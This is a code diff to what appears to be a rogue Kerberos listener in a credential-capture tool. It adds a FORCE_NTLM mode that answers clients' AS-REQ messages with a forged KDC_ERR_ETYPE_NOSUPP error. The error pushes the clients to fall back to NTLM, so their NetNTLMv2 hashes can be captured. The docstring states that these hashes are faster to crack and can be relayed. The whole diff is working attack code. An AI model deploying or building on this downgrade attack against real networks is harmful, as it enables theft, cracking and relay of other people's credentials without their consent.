@@ -444,6 +444,85 @@ def build_krb_error(realm, cname, sname=None):
 	
 	return krb_error
 
+def build_krb_error_force_ntlm(realm, cname, sname=None):
+	"""
+	Build KRB-ERROR with KDC_ERR_ETYPE_NOSUPP (14)
+	This forces the client to fall back to NTLM authentication
+	
+	Useful when you want NetNTLMv2 hashes instead of Kerberos AS-REP:
+	- NetNTLMv2 is often faster to crack
+	- Can be relayed to other services
+	"""
+	
+	# Get current time
+	current_time = time.time()
+	time_str = time.strftime('%Y%m%d%H%M%SZ', time.gmtime(current_time))
+	susec = int((current_time - int(current_time)) * 1000000)
+	
+	# Build sname (server name)
+	if sname is None:
+		sname = 'krbtgt'
+	
+	# Build the inner SEQUENCE
+	inner = b''
+	
+	# [0] pvno: 5
+	inner += b'\xa0\x03\x02\x01\x05'
+	
+	# [1] msg-type: 30 (KRB-ERROR)
+	inner += b'\xa1\x03\x02\x01\x1e'
+	
+	# [4] stime (server time)
+	time_bytes = time_str.encode('ascii')
+	inner += b'\xa4' + encode_asn1_length(len(time_bytes) + 2) + b'\x18' + encode_asn1_length(len(time_bytes)) + time_bytes
+	
+	# [5] susec (microseconds)
+	susec_bytes = struct.pack('>I', susec)
+	while len(susec_bytes) > 1 and susec_bytes[0] == 0:
+		susec_bytes = susec_bytes[1:]
+	inner += b'\xa5' + encode_asn1_length(len(susec_bytes) + 2) + b'\x02' + encode_asn1_length(len(susec_bytes)) + susec_bytes
+	
+	# [6] error-code: 14 (KDC_ERR_ETYPE_NOSUPP) - forces NTLM fallback
+	inner += b'\xa6\x03\x02\x01\x0e'
+	
+	# [9] realm (server realm)
+	realm_bytes = realm.encode('ascii')
+	inner += b'\xa9' + encode_asn1_length(len(realm_bytes) + 2) + b'\x1b' + encode_asn1_length(len(realm_bytes)) + realm_bytes
+	
+	# [10] sname (server principal name)
+	sname_str = sname.encode('ascii')
+	realm_str = realm.encode('ascii')
+	
+	# Build name-string SEQUENCE
+	name_string_seq = b''
+	name_string_seq += b'\x1b' + encode_asn1_length(len(sname_str)) + sname_str
+	name_string_seq += b'\x1b' + encode_asn1_length(len(realm_str)) + realm_str
+	
+	# Wrap in SEQUENCE
+	name_string_wrapped = b'\x30' + encode_asn1_length(len(name_string_seq)) + name_string_seq
+	name_string_tagged = b'\xa1' + encode_asn1_length(len(name_string_wrapped)) + name_string_wrapped
+	name_type = b'\xa0\x03\x02\x01\x02'
+	
+	# Build PrincipalName SEQUENCE
+	principal_seq = name_type + name_string_tagged
+	principal_wrapped = b'\x30' + encode_asn1_length(len(principal_seq)) + principal_seq
+	
+	# Tag [10]
+	inner += b'\xaa' + encode_asn1_length(len(principal_wrapped)) + principal_wrapped
+	
+	# [11] e-text (error description)
+	etext_str = "KDC has no support for encryption type"
+	etext_bytes = etext_str.encode('ascii')
+	inner += b'\xab' + encode_asn1_length(len(etext_bytes) + 2) + b'\x1b' + encode_asn1_length(len(etext_bytes)) + etext_bytes
+	
+	# Wrap in SEQUENCE
+	sequence = b'\x30' + encode_asn1_length(len(inner)) + inner
+	
+	# Wrap in APPLICATION 30 tag
+	krb_error = b'\x7e' + encode_asn1_length(len(sequence)) + sequence
+	
+	return krb_error
+
 def build_pa_data(realm, cname):
 	"""
 	Build PA-DATA sequence for pre-authentication
@@ -571,6 +650,9 @@ class KerbTCP(BaseRequestHandler):
 				return
 			
 			if msg_type == 10:  # AS-REQ
+				# Check operation mode
+				kerberos_mode = getattr(settings.Config, 'KerberosMode', 'CAPTURE')
+				
 				# Check if client sent PA-DATA
 				has_padata, etype = find_padata_and_etype(data)
 				
@@ -626,19 +708,45 @@ class KerbTCP(BaseRequestHandler):
 						if settings.Config.Verbose:
 							print(color('[KERB] AS-REQ with PA-DATA but could not extract hash from %s@%s' % (cname, realm), 1, 1))
 				else:
-					# First AS-REQ without pre-auth - send KRB-ERROR requiring pre-auth
-					if settings.Config.Verbose:
-						print(color('[KERB] AS-REQ from %s@%s - sending PREAUTH_REQUIRED' % (cname, realm), 2, 1))
-					
-					# Build KRB-ERROR response
-					krb_error = build_krb_error(realm, cname)
-					
-					# Send with Record Mark
-					response = struct.pack('>I', len(krb_error)) + krb_error
-					self.request.sendall(response)
-					
-					if settings.Config.Verbose:
-						print(color('[KERB] Sent KRB-ERROR (PREAUTH_REQUIRED) to %s' % self.client_address[0], 2, 1))
+					# First AS-REQ without pre-auth
+					if kerberos_mode == 'FORCE_NTLM':
+						# Force NTLM fallback mode
+						if settings.Config.Verbose:
+							print(color('[KERB] AS-REQ from %s@%s - forcing NTLM fallback' % (cname, realm), 2, 1))
+						
+						# Build KRB-ERROR with ETYPE_NOSUPP
+						krb_error = build_krb_error_force_ntlm(realm, cname)
+						
+						# Send with Record Mark
+						response = struct.pack('>I', len(krb_error)) + krb_error
+						self.request.sendall(response)
+						
+						if settings.Config.Verbose:
+							print(color('[KERB] Sent KDC_ERR_ETYPE_NOSUPP - client should fall back to NTLM', 3, 1))
+						
+						# Log to database
+						SaveToDb({
+							'module': 'Kerberos',
+							'type': 'NTLM-Fallback-Forced',
+							'client': self.client_address[0],
+							'user': cname,
+							'domain': realm,
+							'fullhash': '%s@%s - NTLM fallback forced' % (cname, realm)
+						})
+					else:
+						# Default CAPTURE mode - send pre-auth required
+						if settings.Config.Verbose:
+							print(color('[KERB] AS-REQ from %s@%s - sending PREAUTH_REQUIRED' % (cname, realm), 2, 1))
+						
+						# Build KRB-ERROR response
+						krb_error = build_krb_error(realm, cname)
+						
+						# Send with Record Mark
+						response = struct.pack('>I', len(krb_error)) + krb_error
+						self.request.sendall(response)
+						
+						if settings.Config.Verbose:
+							print(color('[KERB] Sent KRB-ERROR (PREAUTH_REQUIRED) to %s' % self.client_address[0], 2, 1))
 			
 			elif msg_type == 12:  # TGS-REQ
 				if settings.Config.Verbose:
@@ -664,6 +772,9 @@ class KerbUDP(BaseRequestHandler):
 				return
 			
 			if msg_type == 10:  # AS-REQ
+				# Check operation mode
+				kerberos_mode = getattr(settings.Config, 'KerberosMode', 'CAPTURE')
+				
 				# Check if client sent PA-DATA
 				has_padata, etype = find_padata_and_etype(data)
 				
@@ -715,18 +826,43 @@ class KerbUDP(BaseRequestHandler):
 						if settings.Config.Verbose:
 							print(color('[KERB] AS-REQ with PA-DATA but could not extract hash from %s@%s' % (cname, realm), 1, 1))
 				else:
-					# First AS-REQ without pre-auth - send KRB-ERROR requiring pre-auth
-					if settings.Config.Verbose:
-						print(color('[KERB] AS-REQ from %s@%s - sending PREAUTH_REQUIRED' % (cname, realm), 2, 1))
-					
-					# Build KRB-ERROR response
-					krb_error = build_krb_error(realm, cname)
-					
-					# Send directly (no Record Mark for UDP)
-					socket_obj.sendto(krb_error, self.client_address)
-					
-					if settings.Config.Verbose:
-						print(color('[KERB] Sent KRB-ERROR (PREAUTH_REQUIRED) to %s' % self.client_address[0], 2, 1))
+					# First AS-REQ without pre-auth
+					if kerberos_mode == 'FORCE_NTLM':
+						# Force NTLM fallback mode
+						if settings.Config.Verbose:
+							print(color('[KERB] AS-REQ from %s@%s - forcing NTLM fallback' % (cname, realm), 2, 1))
+						
+						# Build KRB-ERROR with ETYPE_NOSUPP
+						krb_error = build_krb_error_force_ntlm(realm, cname)
+						
+						# Send directly (no Record Mark for UDP)
+						socket_obj.sendto(krb_error, self.client_address)
+						
+						if settings.Config.Verbose:
+							print(color('[KERB] Sent KDC_ERR_ETYPE_NOSUPP - client should fall back to NTLM', 3, 1))
+						
+						# Log to database
+						SaveToDb({
+							'module': 'Kerberos',
+							'type': 'NTLM-Fallback-Forced',
+							'client': self.client_address[0],
+							'user': cname,
+							'domain': realm,
+							'fullhash': '%s@%s - NTLM fallback forced' % (cname, realm)
+						})
+					else:
+						# Default CAPTURE mode - send pre-auth required
+						if settings.Config.Verbose:
+							print(color('[KERB] AS-REQ from %s@%s - sending PREAUTH_REQUIRED' % (cname, realm), 2, 1))
+						
+						# Build KRB-ERROR response
+						krb_error = build_krb_error(realm, cname)
+						
+						# Send directly (no Record Mark for UDP)
+						socket_obj.sendto(krb_error, self.client_address)
+						
+						if settings.Config.Verbose:
+							print(color('[KERB] Sent KRB-ERROR (PREAUTH_REQUIRED) to %s' % self.client_address[0], 2, 1))
 			
 			elif msg_type == 12:  # TGS-REQ
 				if settings.Config.Verbose:
